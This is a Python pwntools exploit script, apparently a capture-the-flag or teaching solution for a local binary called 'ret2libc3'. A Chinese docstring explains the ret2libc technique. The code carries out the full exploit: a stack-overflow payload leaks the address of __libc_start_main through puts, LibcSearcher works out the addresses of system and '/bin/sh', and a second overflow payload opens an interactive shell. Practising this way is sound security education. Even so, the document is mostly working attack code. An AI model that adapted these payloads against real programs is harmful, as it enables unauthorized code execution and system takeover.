#!/usr/bin/env python

"""
基本利用思路如下：
1）泄露 __libc_start_main 地址
2）获取 libc 版本
3）获取 system 地址与 /bin/sh 的地址
4）再次执行源程序
5）触发栈溢出执行 system(‘/bin/sh’)

1）详细介绍：
a. 当你将puts函数的地址放在栈上，然后通过控制程序流使其执行puts函数，程序会跳转到puts函数的代码，开始执行它。而puts函数通常用于将一个以null结尾的字符串输出到标准输出（终端）。
b. 在这种情况下，你将__libc_start_main的GOT（Global Offset Table，全局偏移表）地址作为参数传递给了puts函数。这个GOT表是一个特殊的数据结构，包含了程序中需要调用的外部库函数的地址。其中，__libc_start_main函数在程序启动时被调用，因此GOT表中存储了对该函数的引用。
c. 当puts函数被执行时，它会根据传递的地址从GOT表中读取数据，然后将这些数据输出到终端。由于你传递的是__libc_start_main的GOT表地址，puts函数实际上会输出__libc_start_main函数的地址。

"""
from pwn import *
from LibcSearcher import LibcSearcher

sh = process('./ret2libc3')
ret2libc3 = ELF('./ret2libc3')
# context(os="linux", log_level='debug')

puts_plt = ret2libc3.plt['puts']
libc_start_main_plt = ret2libc3.plt['__libc_start_main']
libc_start_main_got = ret2libc3.got['__libc_start_main']
main = ret2libc3.symbols['main']
print("hex(puts_plt): ", hex(puts_plt))
print("hex(libc_start_main_got): ", hex(libc_start_main_got))
print("hex(libc_start_main_plt): ", hex(libc_start_main_plt))
print("hex(main): ", hex(main))

print("leak libc_start_main_got addr and return to main again")
payload = flat(['A' * 112, puts_plt, main, libc_start_main_got])
# sh.sendlineafter('Can you find it !?', payload)
sh.sendlineafter('!?', payload)

print("get the related addr")
libc_start_main_addr_raw = sh.recv(4)
libc_start_main_addr = u32(libc_start_main_addr_raw) 
print("libc_start_main_addr_raw: ", libc_start_main_addr_raw)
print("libc_start_main_addr: ", libc_start_main_addr)
print("hex(libc_start_main_addr): ", hex(libc_start_main_addr))
libc = LibcSearcher('__libc_start_main', libc_start_main_addr)
libcbase = libc_start_main_addr - libc.dump('__libc_start_main')
system_addr = libcbase + libc.dump('system')
binsh_addr = libcbase + libc.dump('str_bin_sh')
print("hex(libcbase): ", hex(libcbase))
print("hex(system_addr): ", hex(system_addr))
print("hex(binsh_addr): ", hex(binsh_addr))

print("get shell")
payload = flat(['A' * 104, system_addr, 0xdeadbeef, binsh_addr])
sh.sendline(payload)

sh.interactive()